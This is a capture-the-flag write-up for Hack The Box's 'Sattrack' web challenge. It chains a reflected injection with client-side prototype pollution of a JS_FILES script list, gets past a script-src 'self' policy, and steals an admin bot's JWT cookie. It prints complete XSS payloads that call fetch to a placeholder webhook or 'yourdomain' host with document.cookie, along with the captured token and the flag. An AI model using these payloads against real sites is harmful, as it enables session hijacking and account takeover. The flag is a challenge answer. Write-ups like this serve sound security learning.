<h1 style="color:blue;"> Sattrack Challenge</h1>

**Platform**: Hack The Box

**Author**: 0xL0m4

**Category**: Web (Medium)

<img width="1667" height="153" alt="image" src="https://github.com/user-attachments/assets/bbf8f550-7de9-4813-b292-f319a88defdb" />


## Challenge Description

Welcome to the Sattrack Bug Bounty Program! Help us find security flaws in our satellite monitoring platform for authorized partners. 

Use partner@rockyou.xyz:partn3r123 to log in. Submit non-security issues via /report for admin support.


## Tools Used

* Burp Suite
* Browser Developer Tools
* Webhook


## Steps

### 1. Login as partner user

I started by logging in using the credentials provided in the challenge description.

After successful login, I accessed the partner dashboard which includes a data sharing feature.

The endpoint looked like this:

```
http://htb.htb:32134/partner/share?type=signals&data=...
```

The parameters are rendered on the page as JSON.

<img width="1920" height="360" alt="image" src="https://github.com/user-attachments/assets/1c0619ed-372b-4d98-8917-103b8586e9ba" />


### 2. Testing input parameters

My first idea was testing for XSS on the data parameter, but it was properly escaped.

Then I moved to the type parameter.

I noticed that it was not being properly sanitized.

I tested a simple payload:

```
\"};alert(1)//
```

The response reflected it as:

```
{"\"};alert(1)//": null}
```

This confirmed that the input was being processed in a way that could potentially lead to injection.

### 3. Reviewing the login page logic

Before logging in as partner, I also noticed an admin login page.

When login fails, the application redirects with:

```
/login?message={"text":"Invalid email or password"}
```

In the JavaScript code, I found that the message parameter is parsed and validated against allowed messages.

```
async function validateMessage(message) {
        const settings = window.settings.ALLOWED_MESSAGES ? window.settings : await retrieveSettings();

        if (settings.ALLOWED_MESSAGES) {
            return Object.values(settings.ALLOWED_MESSAGES).some(allowedMessage => allowedMessage === message.text) ? message : null;
        }
        return null;
    }
async function retrieveSettings() {
      console.log("Retrieving settings");
      try {
          const response = await fetch('/api/config');
          return await response.json();
      } catch (error) {
          console.error("Failed to fetch settings:", error);
          return {
              JS_FILES: [],
              ALLOWED_MESSAGES: []
          };
      }
  }
async function startApplication() {
        const params = new URLSearchParams(window.location.search);
        const userMessage = params.get('message');
        let isValidated = false;
        let defaultConfig = { text: "" };
        try {
            const userConfig = JSON.parse(decodeURIComponent(userMessage));
            
            let config = mergeObjects(defaultConfig, userConfig);
            
            if (await validateMessage(config)) {
                isValidated = true;
            } else {
                isValidated = false;
            }
        } catch (e) {
            console.error("Error processing message:", e);
        }

        await loadScripts();
        if (isValidated) {
            console.log("Validated");
            showError(defaultConfig.text);
        } else if (!isLoaded && userMessage !== null) {
            console.log("Not validated");
            showError("Invalid message!");
        }
    }
```

```
/api/config --> its returns contain allowed messages array
```

<img width="1585" height="778" alt="image" src="https://github.com/user-attachments/assets/b710cac3-372d-4ee4-8ed4-88336ca71fe9" />


### 4. Prototype pollution opportunity

While analyzing the code, I noticed that userConfig is merged into defaultConfig:

```javascript
let config = mergeObjects(defaultConfig, userConfig);
```

This raised a prototype pollution possibility since uncontrolled keys like \_\_proto__ are accepted.


### 5. Abusing JS_FILES injection

While reviewing the frontend code further, I found another critical function:

```javascript
async function loadScripts() {
    const settings = window.settings.JS_FILES ? window.settings : await retrieveSettings();

    if (settings.JS_FILES) {
        await Promise.all(Object.values(settings.JS_FILES).map(src => {
            const script = document.createElement("script");
            script.src = src;
            document.body.appendChild(script);
        }));
    }
}
```

This means any value inside JS_FILES is dynamically loaded as a script.

Since JS_FILES is part of the configuration object, it is also affected by prototype pollution.

I discovered:

* `script-src 'self'` → blocks external domains
* `connect-src *` → allows requests like fetch
  
<img width="637" height="321" alt="image" src="https://github.com/user-attachments/assets/745feb3f-fcb7-4419-9094-8358fcd963cb" />

It make script tag for any urls in JS_FILES array. but it must be the in same origin because of csp policy script-src 'self' 

So, we need a same-origin injection point --> /partner/share?type=<payload here>

the payload is worked --> \"};alert(1)// --> so \"};fetch('yourdomain?c'+document.cookie)// --> return document.cookie if httponly is false

If HttpOnly = false, it means the cookie is accessible from JavaScript.

### 6. Building the XSS payload

Instead of executing external scripts, I pivoted to data exfiltration using a same-origin injection point.

I used /partner/share?type=<payload>

Final payload idea:

* Inject JS via polluted JS_FILES
* Trigger fetch to exfiltrate cookies


### 7. Final exploitation payload

I chained prototype pollution with JS file injection:

```
/login?message={"text":"blabla","__proto__":{"JS_FILES":["/partner/share?type=\"};fetch('https://WEBHOOK_URL?c='%25252bdocument.cookie)//"]}}
```

This caused the application to load a malicious script from the same origin and execute it.

The script then sent the cookies to my webhook.


### 8. Admin bot exploitation

The challenge also included an admin bot that visits submitted URLs.

I submitted a payload starting with:

```
http://127.0.0.1/
```

This ensured the bot would access the vulnerable endpoint locally.

Once triggered, the bot executed my payload and sent the result to my webhook.

the final payload:

```
http://127.0.0.1/login?message={"text":+"fff","__proto__":{"JS_FILES":["/partner/share?type=\"};fetch('yourdomain?c='%25252bdocument.cookie)//"]}}
```

<img width="1920" height="737" alt="image" src="https://github.com/user-attachments/assets/164a06c9-e592-4e77-aa34-b6b214463d17" />

### 9. Getting the admin token

From the webhook request, I received a leaked JWT token:

```
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImFkbWluQHNhdHRyYWNrLmh0YiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc4MjE0ODMyNCwiaWF0IjoxNzgyMDYxOTI0fQ.X8LqoXjRvAOKqIUwYRIkSIQG0RNy5HXUcGPWK5aVk4g
```

This token belonged to the admin user.

<img width="1666" height="697" alt="image" src="https://github.com/user-attachments/assets/ccf574db-a2d4-43dc-bd80-cf3bffe11963" />



### 10. Admin access

There was an /admin panel protected by authentication.

Direct access was denied.

However, after replacing my session token in the browser storage with the leaked admin JWT, I successfully gained access.


### 11. Getting the flag

Voilaaaa, Inside User Management section, the flag was revealed.

```
HTB{cl13nt_s1d3_pp_4r3_d4ng3r0us}
```

#

[The challenge link](https://app.hackthebox.com/challenges/Sattrack?tab=play_challenge)

See you in the next writeup!
 
.سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك
